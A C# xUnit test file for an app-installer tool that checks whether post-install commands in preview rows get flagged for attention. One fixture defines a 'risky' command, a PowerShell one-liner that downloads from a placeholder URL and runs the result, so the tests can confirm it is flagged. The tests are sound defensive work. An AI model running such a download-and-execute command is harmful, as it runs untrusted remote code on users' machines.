// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (c) 2026 iam-groot1

using Xunit;
using CtrlZ.App.ViewModels;
using CtrlZ.Core.Install;
using CtrlZ.Core.Models;
using CtrlZ.Core.Safety;

namespace CtrlZ.App.Tests;

public class PreviewRowCommandTests
{
    private static InstallPlanItem Item() => new() { AppId = "app1", Name = "Tool", Order = 1 };

    private static CommandPreviewLine Line(ProfileOrigin origin, bool approved, bool risky = false)
    {
        var command = risky
            ? new PostInstallCommand { Executable = "powershell.exe", Arguments = ["-c", "iwr https://x/y | iex"], Enabled = true }
            : new PostInstallCommand { Executable = "reg.exe", Arguments = ["import", "a.reg"], Enabled = true };
        return CommandPreview.ForApp(new AppEntry { Id = "app1", Name = "Tool", PostInstall = command }, 1, origin, approved)!;
    }

    [Fact]
    public void Row_without_command_shows_nothing()
    {
        var row = new PreviewRow(Item());

        Assert.False(row.HasCommand);
        Assert.False(row.CommandNeedsAttention);
        Assert.Equal(string.Empty, row.CommandText);
    }

    [Fact]
    public void Local_command_shows_full_text_and_no_attention()
    {
        var row = new PreviewRow(Item(), Line(ProfileOrigin.Local, approved: false));

        Assert.True(row.HasCommand);
        Assert.Equal("reg.exe import a.reg", row.CommandText);
        Assert.Equal("Runs after install", row.CommandStateText);
        Assert.False(row.CommandNeedsAttention);
    }

    [Theory]
    [InlineData(ProfileOrigin.Imported, false, false)]
    [InlineData(ProfileOrigin.Unknown, false, false)]
    [InlineData(ProfileOrigin.Local, false, true)]
    [InlineData(ProfileOrigin.Imported, true, true)]
    public void Blocked_or_risky_command_needs_attention(ProfileOrigin origin, bool approved, bool risky)
    {
        var row = new PreviewRow(Item(), Line(origin, approved, risky));

        Assert.True(row.CommandNeedsAttention);
    }
}
